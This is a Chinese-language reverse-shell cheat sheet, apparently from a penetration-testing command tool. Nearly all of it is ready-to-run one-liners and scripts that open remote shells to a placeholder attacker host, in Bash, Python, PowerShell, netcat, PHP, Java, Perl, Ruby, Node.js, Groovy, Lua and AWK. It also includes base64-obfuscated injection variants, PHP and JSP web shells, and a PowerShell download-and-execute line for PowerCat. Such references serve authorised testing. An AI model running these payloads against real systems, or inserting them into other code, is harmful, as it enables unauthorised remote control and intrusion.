# 反弹Shell

_12 条工具命令_

### Bash反弹Shell  `bash-reverse`
_Bash反弹Shell命令_

**Step 0**
> 基础Bash反弹
_platform: linux_
```
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Step 0**
> exec方式反弹
_platform: linux_
```
exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
```

**Step 0**
> UDP反弹
_platform: linux_
```
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

**Step 0**
> bash -c执行
_platform: linux_
```
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
```

**Step 0**
> Netcat监听
_platform: linux_
```
nc -lvnp PORT
```

---

### Python反弹Shell  `python-reverse`
_Python反弹Shell命令_

**Step 0**
> Python反弹Shell
_platform: linux_
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Step 0**
> Python3反弹
_platform: linux_
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Step 0**
> 获取完整TTY
_platform: linux_
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

### PowerShell反弹Shell  `powershell-reverse`
_PowerShell反弹Shell命令_

**Step 0**
> PowerShell反弹
_platform: windows_
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Step 0**
> Base64编码执行
_platform: windows_
```
powershell -e BASE64_ENCODED_COMMAND
```

**Step 0**
> 使用PowerCat
_platform: windows_
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/powercat.ps1');powercat -c ATTACKER_IP -p PORT -e cmd"
```

---

### Netcat反弹Shell  `nc-reverse`
_Netcat反弹Shell命令_

**Step 0**
> 传统nc反弹
_platform: linux_
```
nc -e /bin/sh ATTACKER_IP PORT
```

**Step 0**
> OpenBSD nc反弹
_platform: linux_
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

**Step 0**
> 监听连接
_platform: linux_
```
nc -lvnp PORT
```

**Step 0**
> 通过nc传输文件
_platform: linux_
```
nc -lvnp PORT < file    # 发送端
nc ATTACKER_IP PORT > file    # 接收端
```

---

### PHP反弹Shell  `php-reverse`
_PHP语言反弹Shell命令集合_

**Step 0**
> 使用exec函数反弹Shell
_platform: linux_
```
php -r '$sock=fsockopen("attacker_ip",4444);exec("sh <&3 >&3 2>&3");'
```
**语法解析：**
- `fsockopen` — 创建TCP连接 _command_
- `exec` — 执行系统命令 _command_

**Step 0**
> 使用proc_open创建交互式Shell
_platform: linux_
```
php -r '$sock=fsockopen("attacker_ip",4444);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

**Step 0**
> 常用PHP一句话木马(仅用于安全测试)
```
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_REQUEST["cmd"]); ?>
<?php eval($_POST["cmd"]); ?>
```

**Step 0**
> 功能完整的PHP反弹Shell脚本
_platform: linux_
```
# 下载完整PHP反弹Shell:
# https://github.com/pentestmonkey/php-reverse-shell
# 修改$ip和$port后上传执行
```

---

### Java反弹Shell  `java-reverse`
_Java语言反弹Shell命令集合_

**Step 0**
> Java Runtime执行反弹Shell
_platform: linux_
```
Runtime rt = Runtime.getRuntime();
String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"};
rt.exec(cmd);
```

**Step 0**
> 用于Payload注入时避免特殊字符问题
_platform: linux_
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}
```
**语法解析：**
- `{echo,BASE64}` — 输出Base64编码的命令 _command_
- `{base64,-d}` — 解码Base64 _command_
- `{bash,-i}` — 执行解码后的命令 _command_

**Step 0**
> JSP Web Shell方式
_platform: linux_
```
<%@page import="java.util.*,java.io.*"%>
<%
Process p=Runtime.getRuntime().exec("bash -c {echo,ENCODED_CMD}|{base64,-d}|{bash,-i}");
%>
```

---

### Perl反弹Shell  `perl-reverse`
_Perl语言反弹Shell命令_

**Step 0**
> Perl标准反弹Shell
```
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

**Step 0**
> Perl IO模块方式
_platform: linux_
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker_ip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

### Ruby反弹Shell  `ruby-reverse`
_Ruby语言反弹Shell命令_

**Step 0**
> Ruby标准反弹Shell
_platform: linux_
```
ruby -rsocket -e'f=TCPSocket.open("attacker_ip",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
**语法解析：**
- `-rsocket` — 加载Socket库 _parameter_
- `TCPSocket.open` — 创建TCP连接 _command_

**Step 0**
> Windows兼容版本
_platform: windows_
```
ruby -rsocket -e 'c=TCPSocket.new("attacker_ip",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

### Node.js反弹Shell  `nodejs-reverse`
_Node.js语言反弹Shell命令_

**Step 0**
> Node.js标准反弹Shell
```
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("sh",[]);var client=new net.Socket();client.connect(4444,"attacker_ip",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'
```
**语法解析：**
- `net.Socket()` — 创建TCP Socket连接 _command_
- `child_process.spawn` — 创建子进程执行Shell _command_

**Step 0**
> 简短版本(适用于eval注入)
_platform: linux_
```
require("child_process").exec("bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'")
```

---

### Groovy反弹Shell  `groovy-reverse`
_Groovy语言反弹Shell(常用于Jenkins)_

**Step 0**
> Groovy完整反弹Shell(用于Jenkins Script Console)
```
String host="attacker_ip";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};
p.destroy();s.close();
```

**Step 0**
> 简短版(Base64编码命令)
_platform: linux_
```
"bash -c {echo,ENCODED_CMD}|{base64,-d}|{bash,-i}".execute()
```

---

### Lua反弹Shell  `lua-reverse`
_Lua语言反弹Shell命令_

**Step 0**
> Lua Socket库反弹Shell
_platform: linux_
```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('attacker_ip','4444');os.execute('sh -i <&3 >&3 2>&3');"
```

**Step 0**
> Lua 5.1兼容版本
_platform: linux_
```
lua5.1 -e 'local host, port = "attacker_ip", 4444 local socket = require("socket") local tcp = socket.tcp() tcp:connect(host, port) while true do local cmd, status = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

---

### AWK反弹Shell  `awk-reverse`
_AWK语言反弹Shell命令_

**Step 0**
> AWK网络功能反弹Shell
_platform: linux_
```
awk 'BEGIN {s = "/inet/tcp/0/attacker_ip/4444"; while(42) { do{ printf "shell> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
**语法解析：**
- `/inet/tcp/0/` — AWK内置TCP连接 _command_
- `attacker_ip/4444` — 目标地址和端口 _value_

**Step 0**
> GNU AWK简化版
_platform: linux_
```
gawk 'BEGIN{s="/inet/tcp/0/attacker_ip/4444";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}'
```

---
